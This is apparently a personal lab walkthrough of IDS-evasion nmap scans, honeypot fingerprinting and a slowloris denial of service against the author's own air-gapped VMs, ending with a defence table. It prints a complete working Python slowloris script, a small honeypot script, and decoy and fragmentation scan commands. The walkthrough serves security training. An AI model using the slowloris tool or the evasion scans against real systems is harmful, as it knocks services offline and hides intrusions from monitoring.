# Viewer Step-by-Step Guide - Lab 8: Evasion, IDS Bypass & DoS

> A follow-along walkthrough of how this lab was actually done, including the dead-ends and how they were solved. Everything runs inside a self-built, air-gapped lab against VMs I own. Never point these techniques at anything you don't control.

---

## 0. Setup

Two VMs on: **Kali** (`192.168.56.102`, attacker) and **Metasploitable2** (`192.168.56.101`, target, Apache on :80). Confirm reachability:

```bash
ping -c 3 192.168.56.101
mkdir -p ~/lab8 && cd ~/lab8
```

---

## 1. Task 1 - Evasion

**Start a capture first** (second terminal), so you can prove the evasion on the wire:

```bash
sudo tcpdump -i eth0 host 192.168.56.101 -w evasion_capture.pcap
```

Then run the scan variants in the first terminal:

```bash
sudo nmap -sS -f -p 21,22,80,139,445 192.168.56.101 -oN frag8_scan.txt       # 8-byte fragments
sudo nmap -sS --mtu 24 -p 21,22,80,139,445 192.168.56.101 -oN frag_mtu24_scan.txt
sudo nmap -sS -T1 --scan-delay 1s -p 21,22,80 192.168.56.101 -oN timing_scan.txt   # slow = evasion
sudo nmap -sS -D RND:5 -p 80,445 192.168.56.101 -oN decoy_scan.txt           # hide among 5 fake IPs
sudo nmap -sS --source-port 53 -p 80 192.168.56.101 -oN srcport_scan.txt     # pose as DNS
```

> **Gotcha I hit:** running `--mtu 24` over `-p 1-200` hung for hours. Fragmented scans of big port ranges are painfully slow. Narrow it to the few ports you care about and it finishes in seconds. The fragmentation evidence is identical either way.

**Prove it.** Stop the capture (Ctrl-C) and open it:

```bash
wireshark evasion_capture.pcap &
```

Filter bar:

```
ip.flags.mf == 1 || ip.frag_offset > 0
```

You'll see the fragmented packets (mine showed 15, each 42 bytes with an 8-byte data fragment). That filtered view is the headline evidence, screenshot it.

---

## 2. Task 2 - Honeypot detection

A honeypot is a decoy that looks vulnerable. To learn the signatures, I stood one up and detected it. Create a tiny honeypot that opens many ports with one fake banner:

```bash
cat > honeypot.py << 'EOF'
import socket, threading
PORTS = [21,23,25,110,143,445,1433,3306,3389,5900,8080,9200]
def serve(p):
    try:
        s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.bind(('0.0.0.0',p)); s.listen(5)
        while True:
            c,_=s.accept(); c.send(b'220 Service ready\r\n'); c.close()
    except Exception as e: print('port',p,'skipped:',e)
for p in PORTS: threading.Thread(target=serve,args=(p,),daemon=True).start()
print('honeypot running on', len(PORTS), 'ports... press Enter to stop')
input()
EOF
python3 honeypot.py
```

From the other terminal, fingerprint it:

```bash
sudo nmap -sT -sV -p 21,23,25,110,143,445,1433,3306,3389,5900,8080,9200 192.168.56.102 -oN honeypot_scan.txt
```

**The tell:** nmap throws FTP, HTTP, SMB, RDP, MySQL probes at every port and gets the **same** `220 Service ready` back every time. It prints *"9 services unrecognized despite returning data."* A real RDP or MySQL port would never answer with an FTP-style `220`. Document those signatures (too many ports, uniform banners, no real service, protocol mismatch).

---

## 3. Task 3 - Low-impact DoS

**Snapshot Metasploitable2 first** (VirtualBox -> Snapshots -> Take). Then baseline the target:

```bash
curl -s -o /dev/null -w 'HTTP %{http_code}  time %{time_total}s\n' http://192.168.56.101/   # mine: 200, 1.66s
```

> **Gotcha:** neither `slowloris` nor `slowhttptest` was installed, and Kali was air-gapped. Instead of the NAT-install dance, I wrote a pure-Python slowloris, no install, runs offline:

```bash
cat > slowloris.py << 'EOF'
import socket, time, random
TARGET, PORT, N = "192.168.56.101", 80, 200
def mk():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(4)
    s.connect((TARGET, PORT))
    s.send(("GET /?%d HTTP/1.1\r\n" % random.randint(0,99999)).encode())
    s.send(b"User-Agent: Mozilla/5.0\r\n"); s.send(b"Accept-language: en-US,en\r\n")
    return s
socks = []
for _ in range(N):
    try: socks.append(mk())
    except: pass
print("opened %d sockets, holding them open..." % len(socks))
try:
    while True:
        for s in list(socks):
            try: s.send(("X-a: %d\r\n" % random.randint(0,99999)).encode())
            except: socks.remove(s)
        while len(socks) < N:
            try: socks.append(mk())
            except: break
        print("holding %d connections open" % len(socks)); time.sleep(10)
except KeyboardInterrupt:
    print("stopping, closing sockets"); [s.close() for s in socks]
EOF
python3 slowloris.py
```

While it holds 200 connections, measure from the other terminal:

```bash
curl -m 5 -s -o /dev/null -w 'HTTP %{http_code}  time %{time_total}s\n' http://192.168.56.101/
```

Mine returned **HTTP 000** (no response, 5s timeout) - Apache's workers are all tied up. That's the DoS.

**Stop and recover:** Ctrl-C the slowloris, wait ~15s, re-run the curl. It came back **HTTP 200 at 0.26s**. Recovered on its own, which is how you close a DoS test responsibly. Record all three numbers (before / during / after).

---

## 4. What it all means

| What I did | Why it matters | Defence |
|---|---|---|
| Fragmented / slow / decoyed scans | Designed to evade signature + rate detection (no live IDS this run) | IDS stream reassembly, low-and-slow detection |
| Detected a honeypot | Decoys have tell-tale uniformity | Fingerprint checks; use honeypots as sensors |
| Exhausted Apache with 200 slow conns | Cheap denial of service | mod_reqtimeout, per-IP limits, reverse proxy |

---

*Self-built, air-gapped lab against my own VMs. No production system or real data involved.*

**CyberJKD - Becoming dangerous through fundamentals.**
